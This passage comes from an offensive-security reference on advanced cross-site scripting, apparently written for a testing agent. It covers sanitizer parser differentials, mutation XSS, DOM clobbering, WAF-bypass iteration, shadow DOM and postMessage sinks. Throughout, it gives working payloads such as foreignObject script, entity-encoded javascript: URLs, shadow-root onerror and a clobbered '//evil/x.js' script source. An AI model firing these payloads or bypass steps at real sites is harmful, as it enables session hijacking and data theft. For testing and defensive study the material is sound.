- **RAWTEXT state** — entered for `<script>`, `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>`, `<noscript>` (in some parsing modes). Text is passed literally; only `</tagname>` closes the state. A `<style>...</style>` inside sanitizer output is subject to the sanitizer's RAWTEXT handling, which may differ from the browser's.
- **RCDATA state** — entered for `<textarea>`, `<title>`. Text supports character references but no other tags. `<textarea>&lt;script&gt;alert(1)&lt;/script&gt;</textarea>` is text in RCDATA (safe), but if the sanitizer removes the `<textarea>` and merges adjacent text, the character-referenced content re-parses.
- **Plaintext state** — entered for `<plaintext>`. Everything after is plaintext; no tag ends it. Sanitizers that don't handle `<plaintext>` may open the state and leave it open, resulting in the rest of the page being interpreted as plaintext.
- **Script data state** — a specialized state for `<script>` contents with the additional `<!--...--><script>...</script>` escape shape. Nested `<script>` tokens can escape from the escaped state.

**Tree-construction states of exploitation interest**:

- **In body**, **In table**, **In caption**, **In table body**, **In row**, **In cell** — the insertion modes for table contents. `<table><td><script>` produces different tree shapes depending on whether table-fostering repair fires.
- **In head**, **After head**, **In frameset** — different insertion modes with different tag admissibility.
- **In select** — inside `<select>`, tags other than `<option>`/`<optgroup>`/`<script>` are ignored. A `<select><img></select>` produces `<select></select>` (the `<img>` is discarded).
- **In template** — inside `<template>`, content is parsed as a fragment; the fragment is inserted into the template's content property, not the main tree.

### Integration points — SVG/MathML/HTML boundaries

The HTML5 spec defines "HTML integration points" and "MathML text integration points" where foreign-content parsing switches back to HTML. These are the classic mXSS surfaces.

- **HTML integration point elements** (in MathML namespace): `<mtext>`, `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<annotation-xml encoding="text/html">` — inside these, HTML re-enters.
- **HTML integration point elements** (in SVG namespace): `<foreignObject>`, `<title>`, `<desc>` — same.
- **MathML text integration points**: `<mtext>`, `<mi>`, `<mo>`, `<mn>`, `<ms>`.
- **HTML integration points in `<annotation-xml>`**: only when `encoding="text/html"` or `application/xhtml+xml`.

Sanitizers must track namespace transitions. DOMPurify's tree walk enters SVG when it sees `<svg>`, and exits at the top of the SVG subtree — but if the SVG contains an HTML integration point, the sanitizer must switch back to HTML rules for the descendants. A sanitizer that models "SVG namespace throughout the subtree" misses the switch.

Payload class: `<svg><foreignObject><script>alert(1)</script></foreignObject></svg>` — the `<script>` inside `<foreignObject>` is HTML, not SVG script; different execution semantics.

### Foreign-content boundaries and mutation

A key parser-differential class: the browser's tree construction for foreign content is stateful across siblings. `<math><mtext><table><mglyph><style>...` from the DOMPurify CVE cluster demonstrates how the state machine reaches an HTML integration point through table-repair.

The specific WHATWG algorithm involved:
1. `<math>` opens MathML.
2. `<mtext>` is an HTML integration point — HTML re-enters.
3. `<table>` in HTML integration point context forces table-insertion-mode.
4. `<mglyph>` in table context... — the details produce a repair path where subsequent `<style>` reaches an HTML re-entry that carries the `<img onerror>` as live HTML.

The specific path is documented in the CVE-2024-47875 writeup; the general class is "foreign content plus table repair plus subsequent HTML integration point."

### Template-tag content parsing

`<template>` content is parsed as a `DocumentFragment` and inserted into the template's `.content` property, not the main tree. Sanitizers that walk `element.children` miss the `<template>` content; a payload inside `<template>` may not be sanitized at all until the template is activated (via `document.importNode(template.content, true)` or attachment as `shadowRoot`).

Payload class: `<template><script>alert(1)</script></template><div id="activator"></div>` — if the app later activates the template into `#activator`, the script executes.

Sanitizer mitigation: recursively walk `element.content` for template elements. Some sanitizers do; some don't.

### Custom-element upgrade timing

`<custom-el>` in sanitizer output is treated as an unknown element (bland). At runtime, if `customElements.define('custom-el', class extends HTMLElement { connectedCallback() { ... } })` is called before the element is attached, the element is *upgraded* — the constructor runs, `connectedCallback` runs. If the constructor or `connectedCallback` has side effects (calls `innerHTML` on itself with attribute-derived content), it's a class of engine-deferred mutation (see `xss_novel_deep.md § Engine-Deferred Mutation`).

### Comment-parse exceptions

HTML5 has an exception for `<! ... >` — a bogus comment that treats subsequent content until `>` as comment-like. Sanitizers that expect only `<!--...-->` miss this. The CVE-2025-26791 mechanism relies on this — the sanitizer's first parse treats content inside `<! ... >` as inert text; the browser's second parse hydrates it as a comment / executable node.

### Adjacency effects

- **Text-node coalescing** — the parser merges adjacent text nodes after tree construction. If a sanitizer removes an element between two text nodes, the merged text node may form a live expression. CVE-2025-26791's second mechanism relies on this.
- **Optional-tag inference** — some tags (`<html>`, `<head>`, `<body>`, `<p>`, `<li>`, `<tr>`, `<td>`) are optional and the parser inserts them implicitly. The inferred tree may differ from what a sanitizer produced.
- **Formatting-element reconstruction** — the Adoption Agency Algorithm restructures the tree when misnested formatting tags are closed. Complex; historically a source of parser bugs.

### Character-reference resolution

Attribute values decode HTML entities (`&amp;`, `&#97;`, `&#x61;`). Text nodes decode differently based on the parse state. `&colon;` in an attribute value equals `:`; in a text node, may equal `:` or literal `&colon;` depending on the entity table version.

Payload class: `<a href="javascript&colon;alert(1)">click</a>` — a sanitizer that strips `javascript:` in the raw attribute value misses `javascript&colon;` because the sanitizer's tokenizer normalizes it too late. Confirmed with older DOMPurify versions.

### The systematic identification method

1. Parse a candidate payload through the sanitizer.
2. Serialize the sanitizer's output.
3. Load the serialized output into a fresh browser context (`element.innerHTML = output`).
4. Walk the resulting DOM; compare against the sanitizer's approved tree.
5. Any difference is a bypass candidate. Any executing node (script, event handler, javascript: URL) is a confirmed bypass.

Automated tooling (Cure53's DOMPurify test harness, mutationXSS testing frameworks) runs this diff at scale. The resulting bugs form the 2024–2026 CVE cluster.

## DOM Clobbering Advanced

The base file covers the DOM clobbering primitive (id/name attribute references, nested collections, DOM API shadowing). This section is the advanced surface — attribute-shape clobbering, named vs indexed property collision, cross-namespace clobbering, HTMLCollection semantics, toString/valueOf coercion for reaching non-string sinks, and the prototype-pollution composite.

### Attribute-shape clobbering — the full primitive

Named HTML elements create properties on `document`, `window`, and adjacent elements. The primitives:

- `<a id=x></a>` — `document.x` (via `document[<id>]`) and `window.x` are the `<a>` element.
- `<img name=y>` — `document.y` is the `<img>`.
- `<form id=f><input name=x></form>` — `f.x` is the input; `document.f.x` chains.
- `<div id=x></div><div id=x></div>` — `document.x` is an `HTMLCollection` of two elements.
- `<div id=x name=y></div>` — participates in both id-index and name-index; the collection semantics apply.

### Named property vs indexed property collision

The DOM spec's "named property" lookup is checked before the "own property" lookup on `document`. `document.getElementById` is a method (own property); `document.x` where `x` is a named element shadows own properties in specific cases (mostly on `<form>` and `HTMLCollection`, but historically on `document` itself).

- `<img name=getElementById>` — `document.getElementById` may or may not shadow to the img; behavior differs across browsers.
- `<form id=f><input name=submit></form>` — `document.f.submit` is the input, not the form's `submit()` method; calling `document.f.submit()` throws because the input isn't callable.

### Cross-namespace clobbering

SVG and MathML introduce their own element namespaces. SVG's `id`/`name` attributes participate in the same DOM clobbering surface as HTML:

- `<svg><a id=config><rect name=scriptSrc/></a></svg>` — the SVG `<a>`'s `id` reaches `document.config`; SVG `<rect>`'s `name` may or may not reach the collection depending on the browser (Firefox and Chrome behave differently here as of 2024–2025).
- `<math><mi id=config><mn name=scriptSrc/></mi></math>` — MathML equivalent; less-tested surface, more parser-variance.

Cross-namespace chains reach further than same-namespace chains because sanitizers usually miss the cross-namespace attribute-reference surface (they check "does the tag accept id attribute in its own namespace?" and miss the cross-namespace named-property lookup).

### HTMLCollection semantics — the property chain

When two elements share an id, `document[id]` returns an HTMLCollection. Accessing `.propertyName` on an HTMLCollection returns the *named-property-lookup* on the collection, which is a specific algorithm:

- The collection has an `item(index)` method returning the element at that index.
- Named property access: iterate the collection; if any element has `id == name` OR (`<a>`/`<area>`/`<embed>`/`<form>`/`<iframe>`/`<img>`/`<object>` etc.) AND `name == name`, return that element.

So `document.x.y` where `x` is a two-element collection with the second having name="y" is a working chain.

### Form-element clobbering with named children

`<form>` is special: its named children (inputs, buttons, selects) are accessible as properties directly on the form element and (via the form) on `document.forms`. This gives a two-hop chain:

- `<form id=config><input name=url value="//evil/x.js"></form>`
- `document.config.url.value` → `"//evil/x.js"`
- Or via coercion: `document.config.url + ''` — depends on `.toString()`

### toString / valueOf coercion per sink type

The clobbered node must be coerced to the sink's expected type. Different sinks coerce differently:

- **`element.src = obj`** — `String(obj)` calls `obj[Symbol.toPrimitive]('string')` if defined, else `obj.toString()`. An `<a>`.toString() returns its `href`.
- **`element.innerHTML = obj`** — same coercion.
- **Object destructuring or property access** — no coercion; the object identity flows.
- **Arithmetic contexts (`obj + 1`)** — calls `valueOf` first, then `toString`.
- **String concatenation (`"a" + obj`)** — calls `Symbol.toPrimitive('default')`.
- **Loose equality (`obj == "str"`)** — calls `Symbol.toPrimitive('default')`.

The chained-collection form (`document.config.url` returning an `<input>`) needs an additional `.value` step to become a string; some sinks may or may not read `.value` automatically.

### Text-node clobbering via the meta tag

`<meta name="config" content="attacker-value">` — some frameworks read `document.querySelector('meta[name=config]').content` for config. A meta injection with an attacker-controlled `content` doesn't require id-clobbering, and it's a plain attribute value, so the coercion is direct.

### The `<template>` clobbering carveout

`<template>` doesn't participate in id/name lookups until its content is activated. Injecting `<template id="config">...` doesn't create `document.config` until `document.importNode(template.content, true)`.

### Prototype-pollution + DOM clobbering combination

Two-step chain where the target is vulnerable to both:

1. DOM clobber a `<meta>` or `<input>` shape to a JSON-shape polluted value.
2. Some framework deserializer reads the meta/input and merges into a config, triggering prototype pollution.
3. Downstream reads the polluted value from `Object.prototype`.

The clobbering step doesn't reach script directly; it primes the pollution source. Then the pollution reaches script via a downstream sink. Load `prototype_pollution` for the merge-shape sources and `xss.md`'s DOM clobbering section for the base primitive.

## Framework Compile-Time-vs-Runtime Sanitization Differential

The base file names Angular's CVE-2026-88057 with its five enumerable patterns. This section generalizes the class shape to other frameworks with their compile pipelines.

### The class shape

Frameworks that sanitize at compile time based on a directive/component's declared selector, then apply the compiled sanitization at runtime to whatever host element the directive actually attaches to, produce a compile-time-vs-runtime differential if the concrete host element is a different security-context than the declared one.

### Angular anchor — pointer only

The Angular CVE-2026-88057 compile-time-vs-runtime differential is the anchor instance of this class. Its canonical affected-version table (`@angular/core` and `@angular/compiler` ranges), GHSA, the five enumerable patterns (hostDirectives composition, class inheritance, dynamic instantiation via `createComponent`, SVG/MathML namespaces, tag-neutral selectors), per-pattern operational depth with detection greps, and confirmation signal live in `xss_novel_deep.md § Angular CVE-2026-88057 — Five-Pattern Depth`. This section covers the class shape generalized to other frameworks below; the Angular specifics are not restated here.

### Vue 3 SFC compiler

Vue 3's Single-File Component (SFC) compiler generates render functions from `<template>` blocks at build time. The compile-time SecurityContext:

- Static `<a :href="user">` — the compiler emits code that sanitizes `user` as a URL. If `user` is a `javascript:` URL, Vue 3 blocks it in the template compiler.
- Dynamic `<component :is="tagName">` — the compiler doesn't know what tag will be used at runtime; if `tagName` is user-influenced, the sanitizer context is unresolved and may default to the least-restrictive.
- `v-html` — always the sink; no differential, just an unsafe API.

The Vue 3 differential is less pronounced than Angular's because Vue's compile-time knowledge is more limited by design; runtime enforcement at the sink is stronger.

### React JSX compile pipeline

React's JSX transformer converts `<div>{x}</div>` to `React.createElement('div', null, x)`. At runtime, `React.createElement` sanitizes props against a hardcoded map of dangerous props (`dangerouslySetInnerHTML`, `srcSet`, etc.). Differentials:

- **Prop spreading** — `<Component {...props}>` — the transformer emits `React.createElement(Component, props)`. Runtime doesn't know at compile time what `props` contains; a prop like `dangerouslySetInnerHTML` bypasses static analysis.
- **Custom components** — `<Component>` where Component is a class or function — the compiler doesn't sanitize; the component's own render decides.
- **`javascript:` URLs in href/src** — React ≥16.9 warns but still renders. `<a href={userUrl}>` with `userUrl = "javascript:alert(1)"` is live unless the app validates the scheme.

The differential class in React is less about compile-time-vs-runtime and more about prop-spreading vs static prop analysis. Prop-spreading with untrusted input is the primary risk.

### Svelte compiler

Svelte compiles `<Component>` markup to imperative DOM code. The compile-time sanitization:

- `{@html user}` — compiles to `.innerHTML = user`. No sanitization at compile or runtime.
- `<a href={user}>` — compiles to `.href = user`; if `user` is `javascript:`, the browser blocks it (in modern browsers) or renders it (in older).
- `{#if user}` — compile-time-known condition; user-controlled expression fires at compile if `user` reaches the template source.

Svelte's compile-time-vs-runtime differential is subtle: the compiler is aggressive about dead-code elimination, and a condition that's compile-time-evaluated as false may still render a component in a rare hot-swap scenario.

### Solid JSX compiler

Solid's JSX compiler is JSX-shape but produces reactive primitives. The differential:

- `<a href={user}>` — compiles to a reactive effect setting `.href`. `javascript:` URLs pass through unless the app validates.
- `innerHTML={user}` — compiles to `.innerHTML = user`. Direct sink.
- `<Dynamic component={tagName}>` — dynamic component selection; compile-time context unresolved.

### The discovery method

For each framework:
1. Identify the compile-time sanitization function (Angular's `DomSanitizer` context resolution, Vue's `createBaseVNode` context, React's props-sanitization).
2. Enumerate the ways a runtime host can differ from compile-time host (composition, inheritance, dynamic instantiation, namespace, selector-neutrality, prop-spreading).
3. For each combination, check whether the sanitizer is re-applied at runtime or whether the compile-time result is trusted.

## WAF and Filter Bypass Classes — Depth

The base file's filter/WAF evasion section names case, whitespace, event-handler breadth, tag breadth, encoding layers. This section is the class-mechanism depth applied at every layer with the multi-axis iteration methodology.

### Encoding-layer differentials

The WAF sees the raw request bytes; the app decodes them into a string; the browser parses that string. Every layer boundary is an encoding differential opportunity.

**URL decoding differentials**:
- **Single URL-decode** — HTTP form-encoded params decode once at the app boundary. A payload URL-encoded once (`%3Cscript%3E`) reaches the app as `<script>`. WAF that URL-decodes the same way sees the same thing.
- **Double URL-encode** — `%253Cscript%253E`. The WAF's regex sees `%253Cscript%253E`; if the app decodes once, it sees `%3Cscript%3E`; if the app decodes twice (via a framework-level second decode), it sees `<script>`. The differential lands when the app decodes N+1 times and the WAF decodes N.
- **UTF-8 encoding of ASCII** — `%C0%BCscript%C0%BE` — overlong UTF-8 encoding of `<` and `>`. Rejected by strict UTF-8 decoders (modern Node, Python); accepted by lenient decoders (older PHP, some legacy engines).

**HTML entity decoding**:
- Attribute values decode entities before parsing: `<a href=&#106;avascript:alert(1)>` — the `&#106;` is `j`; a filter for `javascript:` misses this.
- Text nodes decode differently: `<title>&lt;script&gt;alert(1)&lt;/script&gt;</title>` is text in the title; if the title later becomes the innerHTML of another element (page-title-widget shape), the entities re-decode and reach parser.
- Named entities: `&colon;` = `:`, `&#x3A;` = `:`, `&period;` = `.`. Full entity table has surprising members.

**JSON string decoding**:
- `"<script>"` in JSON becomes `<script>` after parse. A filter inspecting the JSON *source bytes* misses the decoded output.
- `"\x3c\x2fscript\x3e"` — JSON string escapes; same class.
- Multi-encoded: JSON string containing a URL-encoded HTML-entity payload. Each layer decodes at a different boundary.

**Charset differentials**:
- A response without a `charset` header may be sniffed. Legacy UTF-7 shape: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` — reads as `<script>alert(1)</script>` under UTF-7. Modern browsers refuse UTF-7 sniffing in most contexts.
- `X-Content-Type-Options: nosniff` disables sniffing; absence of this header is a distinct execution vector.

**HTTP Content-Encoding differentials**:
- Chunked encoding + smuggling — the WAF may parse the HTTP body one way, the app another. Load `http_request_smuggling` for the general class.
- Compression handling — `Content-Encoding: gzip` with malformed compression; some WAFs decompress, some don't. Payload in a compression stream that the WAF misses.

### Tokenizer-layer differentials

- **Case** — `<ScRiPt>` parses as `<script>`. WAF regex without `/i` flag misses.
- **Whitespace** — HTML tokenizer accepts `\t`, `\n`, `\r`, `\f` as attribute-name separators; `<svg%09onload=alert(1)>` (tab) parses identically to space-separated. WAF regex `<svg onload` misses the tab variant.
- **Slash-as-separator** — `<svg/onload=alert(1)>` — the `/` is an attribute-name separator on non-void elements in HTML5.
- **Comment insertion** — `<script/**/>alert(1)</script>` — some WAFs treat `/**/` as JavaScript-comment; browsers treat it as tag-name suffix.
- **Attribute-name quoting** — `<img "src"="x" "onerror"="alert(1)">` — quoted attribute names; some parsers accept, some reject.

### Parser-layer differentials

- **Foreign-content parsing** — SVG and MathML have distinct parsers. `<svg><script>alert(1)</script></svg>` executes as SVG script with different semantics.
- **Template tag** — `<template><script>alert(1)</script></template>` — script inert until template activation.
- **Custom element upgrade** — `<xss-test>` treated as unknown; runtime `customElements.define('xss-test', ClassWithSideEffects)` upgrades and runs constructor.
- **Namespace-crossing repair** — parser implicitly closes `<foreignObject>` at HTML integration points; resulting DOM differs from static parse.
- **`<noscript>` semantics** — `<noscript>` content is text when scripting enabled, tree when disabled; sanitizer's tree walk may miss.

### Sink-layer differentials

- **Event-handler breadth** — the full DOM event list has 100+ entries. WAFs commonly list top-20 (`onload`, `onerror`, `onclick`, `onmouseover`, `onfocus`, `onblur`, `onchange`, `onsubmit`, `onreset`, `onkeydown`, `onkeyup`, `onkeypress`, `onselect`, `onunload`, `onbeforeunload`, `onhashchange`, `onmessage`, `onstorage`, `onoffline`, `ononline`). The long tail: `onpointerenter`, `onpointerover`, `onpointerdown`, `onpointerup`, `onpointercancel`, `onpointermove`, `onpointerout`, `onpointerleave`, `ongotpointercapture`, `onlostpointercapture`, `onanimationstart`, `onanimationend`, `onanimationiteration`, `onanimationcancel`, `ontransitionrun`, `ontransitionstart`, `ontransitionend`, `ontransitioncancel`, `onwheel`, `onfocusin`, `onfocusout`, `ontoggle` (`<details open ontoggle=alert(1)>`), `onbeforeinput`, `oninput`, `onauxclick`, `oncontextmenu`, `ondragstart`, `ondragend`, `ondragover`, `ondragenter`, `ondragleave`, `ondrop`, `oncanplay`, `oncanplaythrough`, `onended`, `onerror` (media), `onloadeddata`, `onpause`, `onplay`, `onratechange`, `onseeked`, `onseeking`, `onstalled`, `onsuspend`, `ontimeupdate`, `onvolumechange`, `onwaiting`, `onencrypted`, `onwebkitanimationstart`, `onwebkitanimationend`, `onwebkitanimationiteration`, `onwebkittransitionend`, `oncuechange`, `onemptied`, `onended`, `ontoggle` (details/dialog), `oncopy`, `oncut`, `onpaste`, `onselect`, `oncontextmenu`. Combined with CSS animations for `onanimationstart` (fires immediately with a keyframe), this is a huge implicit surface.
- **URL-scheme breadth** — beyond `javascript:`: `data:text/html,<script>alert(1)</script>`, `data:image/svg+xml,<svg onload=alert(1)>`, `blob:...`, `filesystem:...` (deprecated but present in some contexts), `feed:javascript:...` (Safari legacy), `view-source:javascript:` (Firefox legacy).
- **Attribute-name breadth** — `formaction` on `<button>` inside a form, `srcdoc` on `<iframe>`, `is=` for custom-element upgrade, `xlink:href` on SVG elements, `xml:base` on XML nodes.

### HTTP-layer bypass

- **Parameter pollution** — HTTP allows the same parameter name multiple times. If the WAF inspects the first value and the app reads the second (or vice versa), the differential lands.
- **Content-Type confusion** — the WAF may treat a request as JSON while the app treats it as form-encoded, or vice versa. Send an XSS payload as JSON where the app parses form-encoded (or the opposite).
- **HTTP/2 header case** — HTTP/2 header names must be lowercase; some backends convert but WAFs may not. `X-Custom-Header` vs `x-custom-header` differential.
- **Absolute URI in request line** — `GET http://target/x` vs `GET /x` — some WAFs handle differently.

### Iteration methodology

For each blocked payload, vary one axis at a time and re-test:

1. Case change (`SCRIPT` vs `script`)
2. Whitespace change (`\t` vs space)
3. Slash-as-separator
4. HTML entity encode one character
5. URL-encode one character
6. Double URL-encode
7. JSON string escape
8. Comment insertion (WAF vs browser)
9. Foreign-content wrap (SVG/MathML)
10. Template tag wrap
11. Alternative event handler from the long tail
12. Alternative URL scheme
13. Alternative attribute name
14. HTTP-layer axis (parameter pollution, header case)

The goal: a payload the WAF regex doesn't match but the browser parser still executes as script. Confirm against the actual browser (agent-browser tool, Chrome DevTools), not against the WAF's own regex output.

## Shadow DOM Boundary Exploitation

Shadow DOM creates encapsulated subtrees with separate scope. The security-relevant properties are sanitizer opacity, declarative shadow DOM injection, event retargeting, and the interaction with DOM clobbering.

### Open vs closed mode

`attachShadow({mode: 'open'})` exposes the shadow root via `element.shadowRoot`. Closed mode returns null from that property but is not a security boundary per spec — a Proxy on `attachShadow` intercepts the returned ShadowRoot before the component stores it. Any XSS in the main document can traverse into open shadow roots via `element.shadowRoot.querySelector(...)` and read or modify shadow-internal DOM.

### Sanitizer opacity to shadow roots

Tree-walking sanitizers (DOMPurify, Sanitizer API) walk `element.childNodes` recursively. Shadow roots are NOT part of `childNodes` — they exist on a separate tree. Content inside a shadow root is invisible to the sanitizer. If user-controlled HTML creates a shadow root via declarative shadow DOM, the shadow-internal content bypasses sanitization entirely. DOMPurify added recursive walk of `element.content` for `<template>` handling, but shadow root traversal is not part of its default walk.

### Declarative shadow DOM as injection surface

HTML supports declarative shadow DOM via `<template shadowrootmode="open">`. The parser creates a live shadow root during tree construction — content inside is not deferred like a regular `<template>`:

- `<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>` — the shadow root is created at parse time with the `<img>` as live DOM including the event handler.
- After parsing, the `<template>` element is consumed and does not appear in `element.innerHTML` serialization. The shadow root's content exists on a separate tree.
- A sanitizer that strips `<script>` from template content may miss shadow-root-mode templates because the template is consumed during parsing and the shadow content lives on a separate tree from the host's children.

Detection: check whether the target's sanitizer strips `shadowrootmode` from `<template>` elements. DOMPurify strips it in recent versions; older versions and custom configurations may not.

### Event retargeting across shadow boundaries

Events crossing a shadow boundary are retargeted: `event.target` changes to the shadow host, hiding the actual origin element inside the shadow. `event.composedPath()` returns the full path including shadow-internal elements — use this for tracing event origin across boundaries. Retargeting applies only to events with `composed: true` (most UI events); events with `composed: false` do not cross the boundary at all.

### Slot composition attacks

`<slot>` elements project light-DOM children into the shadow tree. Slotted content retains its light-DOM context — a slotted `<a href="javascript:...">` executes in the light DOM's origin when clicked, even though it renders inside the shadow. If the shadow's CSS positions slotted content over interactive elements, it becomes a UI redress vector combining XSS delivery with visual deception.

### Shadow DOM and DOM clobbering interaction

Shadow-internal elements do NOT participate in `document`-level named property lookup. An element with `id="config"` inside a shadow root does not create `document.config`. Shadow DOM defends its internal elements against clobbering — but an attacker injecting into the light DOM can clobber properties that shadow-internal code reads from `document` or `window`, affecting shadow component behavior indirectly.

## postMessage-Based XSS Sink Depth

`window.postMessage` is a cross-origin communication channel. The security-critical surface is the message handler — any window that obtains a reference to the target (via `window.open`, `<iframe>`, or `window.opener`) can send attacker-controlled data that reaches DOM sinks.

### Origin validation failure classes

Origin validation on `event.origin` is the single control. Failure classes:

- **Missing validation** — no origin check at all. Any origin's message reaches the sink.
- **Substring match** — `event.origin.indexOf('trusted.com') !== -1` — matches `attacker-trusted.com` and `trusted.com.attacker.com`.
- **Endswith without dot-prefix** — `event.origin.endsWith('trusted.com')` — matches `evil-trusted.com`. Must check `.endsWith('.trusted.com')` with leading dot, plus exact match for the bare domain.
- **Regex without anchoring** — `/trusted\.com/.test(event.origin)` — matches `trusted.com.attacker.com`. Must anchor: `/^https:\/\/trusted\.com$/`.
- **null origin acceptance** — `event.origin === 'null'` — `data:` URIs and sandboxed iframes send the string `'null'` as origin. An attacker page at `data:text/html,...` passes this check.
- **Protocol-agnostic check** — accepting both `http://` and `https://` without distinguishing, enabling MITM-sourced messages on the downgraded protocol.

### Sink classes in message handlers

Beyond the canonical `element.innerHTML = event.data`, message handlers commonly reach:

- **`eval(event.data)` / `Function(event.data)()`** — direct code execution from message content.
- **`location.href = event.data`** — open redirect or `javascript:` URL execution from message.
- **`document.write(event.data)`** — document-level HTML sink.
- **jQuery `.html()` / `.append()`** — jQuery HTML sink via message data.
- **Framework state update** — handler updates state (`this.setState({content: event.data})`) that flows to `dangerouslySetInnerHTML` or `v-html`.

The structured clone algorithm preserves complex nested objects. If the handler destructures properties (`event.data.config.templateUrl`), the attacker controls the full object graph — richer than string-only injection because the attacker supplies the exact types and nesting the handler expects.

### Channel variants

- **MessageChannel** — port-to-port communication with the same handler sink pattern. Ports transfer cross-origin via the `transfer` argument to `postMessage`, establishing a dedicated bidirectional channel.
- **BroadcastChannel** — same-origin only, but if the attacker has any XSS on the same origin (even a different page), `BroadcastChannel` reaches every open page's handler on that origin simultaneously.
- **ServiceWorker `postMessage`** — the SW receives messages from controlled clients. If the SW posts back attacker-influenced data, every client page's handler is a sink.

### Discovery method

1. In DevTools, run `getEventListeners(window)` and inspect `message` handlers.
2. Search the target's JavaScript for `addEventListener('message'` and `onmessage =`.
3. For each handler, trace whether `event.origin` is checked and whether `event.data` flows to a DOM sink.
4. Confirm by framing the target and calling `targetFrame.contentWindow.postMessage(payload, '*')` from an attacker-controlled page.

## Mutation XSS (mXSS) — Browser Mutation Primitives

The Sanitizer-vs-Browser Parser-Differential section above covers parser-algorithm divergences at the spec level. This section catalogs the concrete mutation primitives — specific transformations during the parse-serialize-reparse cycle that convert sanitizer-approved output into executable DOM.

### The mutation cycle

1. Sanitizer parses input HTML into a DOM tree (first parse).
2. Sanitizer serializes the approved tree to an HTML string (via `innerHTML` getter).
3. The string is assigned to a sink (`element.innerHTML = sanitizedString`), triggering a second browser parse.
4. The second parse produces a DOM differing from what the sanitizer approved.

Serialization is lossy — the second parse reconstructs a different tree from the serialized representation. Every mXSS primitive exploits a specific lossiness in this cycle.

### Namespace-switching mutation

The parser switches between HTML, SVG, and MathML namespaces. Serialization can lose namespace context:

- Input: `<svg><foreignObject><div><style><img src=x onerror=alert(1)></style></div></foreignObject></svg>`
- First parse: `<style>` inside `<foreignObject>` (HTML integration point) is in HTML namespace. Its content is RAWTEXT — the `<img>` is text, not an element. Sanitizer approves.
- If the sanitizer strips or restructures the SVG/foreignObject wrapper while keeping inner content, the serialized `<style>` may parse in a context where RAWTEXT rules do not apply and `<img>` becomes a live element with the `onerror` handler.

The vulnerability depends on whether the sanitizer preserves full namespace context during serialization. Sanitizers that flatten the tree or strip foreign-content wrappers while keeping inner content are vulnerable.

### RCDATA element context collapse

RCDATA elements (`<textarea>`, `<title>`) treat content as character data — tags inside are not parsed as elements. The mutation primitive:

- Input: `<textarea><img src=x onerror=alert(1)></textarea>` — sanitizer correctly treats `<img>` as inert text inside RCDATA.
- If the sanitizer strips the `<textarea>` wrapper (target context forbids it) while keeping the inner text, the output is `<img src=x onerror=alert(1)>` — now a live element with a firing event handler.

This is context collapse: removing a context-establishing wrapper element changes the parsing rules for the content it contained, promoting inert text to live markup.

### Table fostering mutation

When the parser encounters elements inside `<table>` that aren't valid table content, it "fosters" them — moves them before the table in the DOM:

- Input: `<table><div><img src=x onerror=alert(1)></div></table>`
- First parse: `<div>` is fostered out and placed before `<table>` in the tree.
- Serialization: the fostered `<div>` appears before `<table>` in the output string.
- Second parse: `<div>` with `<img onerror>` is a top-level element, potentially evaluated in a different security context than the sanitizer originally assessed it in.

The position shift means the sanitizer's context-sensitive rules (if any) applied to the element in its original table-internal position, not its fostered position.

### The `<noscript>` dual-parsing semantic

`<noscript>` content parsing depends on the scripting flag:

- **Scripting enabled** (browser default): `<noscript>` content is RAWTEXT — tags inside are text, not elements.
- **Scripting disabled** (some server-side DOM implementations): `<noscript>` content is parsed as HTML — tags inside are live elements.

A sanitizer running with scripting-disabled semantics sees and sanitizes elements inside `<noscript>`. A sanitizer running with scripting-enabled semantics treats the content as inert text and approves it without inspection. The mutation vector fires whichever direction the sanitizer's scripting assumption differs from the browser's rendering context — the mismatch means the sanitizer's approval does not match what the browser executes.

### SVG style content reinterpretation

SVG `<style>` content follows CSS parsing rules — markup inside is CSS text, not HTML. If a namespace-switching mutation places the `<style>` in an HTML context on the second parse, the CSS-text content re-parses as HTML where `<img>` or other tags inside become live elements. This compounds with the namespace-switching primitive: namespace context loss is the first stage, and style-content reinterpretation as HTML is the second stage that produces the executing node.

## Composite Chains — Named Capability Routing

Every advanced XSS finding is a composite: the primitive lands, the confirmation signal proves it, the impact is what the injected script does. Named-capability routing:

- **CSP allowlist bypass (per-CDN DB) → JSONP endpoint → attacker JS in origin** — routing through this file's CSP DB section for the specific endpoint match.
- **Trusted Types default-policy escape → unsanitized innerHTML sink → script execution** — routing through this file's TT-spec-depth section for the enforcement algorithm.
- **DOMPurify version-specific bypass → sanitizer output with live script → in-DOM execution** — routing through `xss_novel_deep.md § DOMPurify CVE Cluster Mechanism by Mechanism` for the specific CVE mechanism.
- **DOM clobbering + prototype-pollution combination → polluted config value → script gadget → execution** — routing through `prototype_pollution` for the pollution source and this file's DOM clobbering section for the coercion.
- **Framework compile-time-vs-runtime differential → sanitizer misapplied at concrete host → script primitive** — routing through `xss_novel_deep.md § Angular CVE-2026-88057 — Five-Pattern Depth` for the specific patterns.
- **WAF bypass via parser-differential → browser executes payload WAF passed → in-DOM script** — routing through this file's WAF-bypass classes.
- **Script gadget (per-library) → non-script HTML injection → gadget converts to script** — routing through this file's per-library gadget catalog.
- **Declarative shadow DOM injection → sanitizer-invisible shadow root → shadow-internal script execution** — routing through this file's Shadow DOM section for the sanitizer-opacity mechanism and declarative shadow DOM surface.
- **postMessage origin validation failure → message handler sink → script execution** — routing through this file's postMessage section for the origin-check bypass classes and sink enumeration.
- **mXSS mutation primitive → sanitizer-approved serialization → browser re-parse mutation → live script node** — routing through this file's mXSS section for the specific mutation primitive and the Sanitizer-vs-Browser section for the parser-algorithm context.

Each hop names the capability transferred. When you report a finding, name what capability moved at each arrow.

## Summary

Advanced XSS depth is where the base's context-and-sink primer meets spec algorithms and parser-differential mechanisms. Trusted Types is an enumerated gated-sink set with residual Non-Goal surface; Google's csp-evaluator DB names specific bypass endpoints per allowlisted CDN; sanitizer-vs-browser parser differentials are a class rooted in the HTML5 parsing algorithm; shadow DOM boundaries create sanitizer-opaque subtrees exploitable via declarative shadow DOM injection; postMessage handlers are a cross-origin sink class gated only by origin validation; mXSS mutation primitives (namespace-switching, context collapse, table fostering, noscript dual-parsing) convert sanitizer-approved output to executable DOM through the parse-serialize-reparse cycle; every chain routes by named capability across siblings. Load `xss_novel_deep.md` for the mechanism-by-mechanism CVE decomposition, the canonical version/fix tables, and the novel classes (engine-deferred mutation, parser-differentials-as-independent-category, non-HTML sinks re-entering the DOM, postMessage/COOP/COEP, XSS-as-authz).
